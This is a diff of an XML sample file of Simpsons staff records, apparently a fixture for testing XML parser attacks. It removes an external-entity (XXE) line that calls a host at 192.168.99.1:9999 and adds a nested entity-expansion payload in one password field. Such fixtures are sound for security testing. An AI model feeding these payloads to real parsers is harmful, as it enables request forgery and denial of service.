@@ -1,14 +1,20 @@
 <?xml version="1.0"?>
-<!DOCTYPE company [
-        <!ENTITY % xxe SYSTEM "http://192.168.99.1:9999">
-        %xxe;]>
+<!DOCTYPE message [
+        <!ELEMENT message (text)>
+        <!ELEMENT text (#PCDATA)>
+        <!ENTITY xxe "lohika, ">
+        <!ENTITY xxe2 "&xxe;&xxe;&xxe;">
+        <!ENTITY xxe3 "&xxe2;&xxe2;&xxe2;">
+        <!ENTITY xxe4 "&xxe3;&xxe3;&xxe3;">
+        ]>
 <company>
     <staff id="1001">
         <firstname>Homer</firstname>
         <lastname>Simpson</lastname>
         <nickname>nuclear</nickname>
         <salary>1</salary>
-        <password>pass</password>
+        <password>&xxe4;</password>
+        <about>About this person</about>
     </staff>
     <staff id="2001">
         <firstname>Bart</firstname>
@@ -16,6 +22,7 @@
         <nickname>skate</nickname>
         <salary>2</salary>
         <password>pass</password>
+        <about>About this person</about>
     </staff>
     <staff id="3001">
         <firstname>Lisa</firstname>
@@ -23,6 +30,7 @@
         <nickname>dummy</nickname>
         <salary>2</salary>
         <password>pass</password>
+        <about>About this person</about>
     </staff>
     <staff id="4001">
         <firstname>Maggie</firstname>
@@ -30,5 +38,6 @@
         <nickname>hairdo</nickname>
         <salary>2</salary>
         <password>pass</password>
+        <about>About this person</about>
     </staff>
 </company>
